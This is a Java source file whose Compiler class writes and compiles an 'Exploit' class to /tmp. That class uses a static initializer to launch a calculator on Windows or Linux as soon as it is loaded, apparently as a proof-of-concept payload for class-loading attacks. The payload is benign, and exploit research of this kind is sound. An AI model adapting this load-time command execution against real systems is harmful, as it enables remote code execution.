import javassist.compiler.CompileError;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.Writer;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import javax.tools.Diagnostic;
import javax.tools.DiagnosticCollector;
import javax.tools.JavaCompiler;
import javax.tools.JavaFileObject;
import javax.tools.StandardJavaFileManager;
import javax.tools.ToolProvider;

public class Compiler {

    private JavaCompiler compiler = null;

    public Compiler(){
        this.compiler = ToolProvider.getSystemJavaCompiler();
    }
    public boolean run( String source ){
        //TODO: win options
        File fileExploitSource = new File("/tmp/Exploit.java");
        if (fileExploitSource.getParentFile().exists() || fileExploitSource.getParentFile().mkdirs()) {
            try {
                Writer writer = null;
                try {
                    writer = new FileWriter(fileExploitSource);
                    writer.write(source);
                    writer.flush();
                } catch (IOException e) {
                    e.printStackTrace();
                } finally {
                    try {
                        writer.close();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
                DiagnosticCollector<JavaFileObject> diagnostics = new DiagnosticCollector<JavaFileObject>();
                StandardJavaFileManager fileManager = compiler.getStandardFileManager(diagnostics, null, null);

                // This sets up the output
                File tempFolder = new File("/tmp");
                List<String> optionList = new ArrayList<String>();
                optionList.add("-d");
                optionList.add(tempFolder.getAbsolutePath());

                Iterable<? extends JavaFileObject> compilationUnit
                        = fileManager.getJavaFileObjectsFromFiles(Arrays.asList(fileExploitSource));
                JavaCompiler.CompilationTask task = compiler.getTask(
                        null,
                        fileManager,
                        diagnostics,
                        optionList,
                        null,
                        compilationUnit);
                if (!task.call()) {
                    System.out.println("- Compilation Failed -");
                    for (Diagnostic<? extends JavaFileObject> diagnostic : diagnostics.getDiagnostics()) {
                        System.out.format("Error on line %d in %s%n",
                                diagnostic.getLineNumber(),
                                diagnostic.getSource().toUri());
                    }
                    throw new CompileError("Compilation Failed");
                } else {
                    System.out.println("- Successful compilation -");
                    System.out.println("- Output class: "+tempFolder.getAbsolutePath()+" -");
                }
                fileManager.close();
            } catch (IOException | CompileError exp) {
                exp.printStackTrace();
                return false;
            }
        }
        return true;
    }

   /* public File createTmpFolder(){
        File parent = new File ("/tmp");
        String name = "classes";
        File subdirectory = parent.toPath().resolve(name).toFile();
        if (!subdirectory.exists()) {
            subdirectory.mkdirs();
        }

        if (!subdirectory.exists() || !subdirectory.isDirectory()) {
            throw new IllegalArgumentException("Invalid directory" + subdirectory.getAbsolutePath());
        }

        return subdirectory;
    }*/

    public static void main(String[] args) {
        /* Exploit.class
        public class Exploit {
            public Exploit() {}
            static {
                    try {
                            String[] cmds = System.getProperty("os.name").toLowerCase().contains("win")
                            ? new String[]{"cmd.exe","/c", "calc.exe"}:
                            new String[] {"/usr/bin/gnome-calculator"};
                            java.lang.Runtime.getRuntime().exec(cmds).waitFor();
                    }catch (Exception e){
                        e.printStackTrace();
                    }
            }
            public static void main(String[] args) {
                Exploit ex = new Exploit();
            }
        }
        */
        StringBuilder sb = new StringBuilder();
        sb.append("public class Exploit {\n");
        sb.append("    public Exploit() {}\n");
        sb.append("         static {\n");
        sb.append("             try {\n");
        sb.append("             String[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"win\")\n" +
                  "                            ? new String[]{\"cmd.exe\",\"/c\", \"calc.exe\"}: \n" +
                  "                            new String[] {\"/usr/bin/gnome-calculator\"};\n" +
                  "                            java.lang.Runtime.getRuntime().exec(cmds).waitFor();\n");
        sb.append("             }catch (Exception e){\n" +
                  "                        e.printStackTrace();\n" +
                  "             }\n");
        sb.append("         }\n");
        sb.append("public static void main(String[] args) {\n" +
                  "         Exploit ex = new Exploit();\n" +
                  "}\n");
        sb.append("}\n");

        Compiler nc = new Compiler();
        nc.run(sb.toString());

    }

}